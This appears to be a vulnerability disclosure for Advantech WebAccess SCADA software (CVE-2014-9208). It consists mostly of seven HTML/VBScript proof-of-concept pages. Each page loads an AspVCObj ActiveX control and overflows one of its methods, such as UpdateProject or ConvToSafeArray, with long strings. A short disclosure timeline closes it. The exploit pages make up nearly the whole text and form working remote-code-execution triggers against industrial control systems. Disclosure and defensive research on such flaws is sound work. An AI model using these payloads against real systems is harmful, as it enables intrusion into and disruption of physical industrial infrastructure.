@@ -1,0 +1,173 @@
+Introduction
+*********************************************************************************
+Using Advantech WebAccess SCADA Software we can remotely manage Industrial
+Control systems devices like RTU's, Generators, Motors etc. Attackers can
+execute code remotely by passing maliciously crafted string to
+ConvToSafeArray API in ASPVCOBJLib.AspDataDriven ActiveX.
+
+Operating System: Windows SP1
+Affected Product: Advantech WebAccess 8.0, 3.4.3
+Vulnerable Program: AspVCObj.dll
+CVE-2014-9208
+
+*********************************************************************************
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+UpdateProject Overflow Remote Code Execution"
+*********************************************************************************
+
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:3703BA5D-7329-4E60-A1A5-AE7D6DF267C1' id='target' />
+<script language='vbscript'>
+
+<!--
+targetFile = "C:\WebAccess\Node\webdobj.dll"
+prototype  = "Sub UpdateProject ( ByVal WwwPort As String ,  ByVal ProjName
+As String ,  ByVal ProjIP As String ,  ByVal ProjPort As Long ,  ByVal
+ProjTimeout As Long ,  ByVal ProjDir As String )"
+-->
+
+arg1="defaultV"
+arg2="defaultV"
+arg3=String(1044, "A")
+arg4=1
+arg5=1
+arg6="defaultV"
+
+target.UpdateProject arg1 ,arg2 ,arg3 ,arg4 ,arg5 ,arg6
+
+</script></html>
+</html>
+
+
+*********************************************************************************
+
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+InterfaceFilter Overflow Remote Code Execution"
+*********************************************************************************
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Function InterfaceFilter ( ByVal Interface As String ) As
+String"
+-->
+
+arg1=String(1044, "A")
+
+target.InterfaceFilter arg1
+
+</script></html>
+
+
+*********************************************************************************
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+FileProcess Overflow Remote Code Execution"
+*********************************************************************************
+
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Sub FileProcess ( ByVal Type As Integer ,  ByVal FileName As
+String )"
+-->
+
+arg1=1
+arg2=String(1044, "A")
+
+target.FileProcess arg1 ,arg2
+
+</script></html>
+
+
+*********************************************************************************
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+GetWideStrCpy Overflow Remote Code Execution"
+*********************************************************************************
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Function GetWideStrCpy ( ByVal Type As Integer ,  ByVal inStr
+As String ) As String"
+-->
+
+arg1=1
+arg2=String(1044, "A")
+
+target.GetWideStrCpy arg1 ,arg2
+
+</script></html>
+
+*********************************************************************************
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+GetRecipeInfo Overflow Remote Code Execution"
+*********************************************************************************
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Function GetRecipeInfo ( ByVal Type As Integer ,  ByVal
+filePath As String )"
+-->
+
+arg1=1
+arg2=String(1044, "A")
+
+target.GetRecipeInfo arg1 ,arg2
+
+</script></html>
+
+*********************************************************************************
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+GetLastTagNbr Overflow Remote Code Execution"
+*********************************************************************************
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Function GetLastTagNbr ( ByVal TagName As String ) As String"
+-->
+
+arg1=String(1044, "A")
+
+target.GetLastTagNbr arg1
+
+</script></html>
+
+*********************************************************************************
+
+Proof of Concept (PoC) for "Advantech WebAccess AspVCObj ActiveX
+ConvToSafeArray Overflow Remote Code Execution"
+*********************************************************************************
+<?XML version='1.0' standalone='yes' ?>
+<html>
+<object classid='clsid:89D00354-B2EA-4755-915D-615D3962C7D7' id='target' />
+<script language='vbscript'>
+<!--
+targetFile = "C:\WebAccess\Node\AspVCObj.dll"
+prototype  = "Function ConvToSafeArray ( ByVal ArrSize As Integer ,  ByVal
+inStr As String )"
+-->
+
+arg1=1
+arg2=String(2068, "A")
+
+target.ConvToSafeArray arg1 ,arg2
+
+</script></html>
+*********************************************************************************
+Vulnerabilities were reported to Advantech sometime in January/February
+2015, coordinated through CSOC.From April 2015 they has been postponing the
+fix.
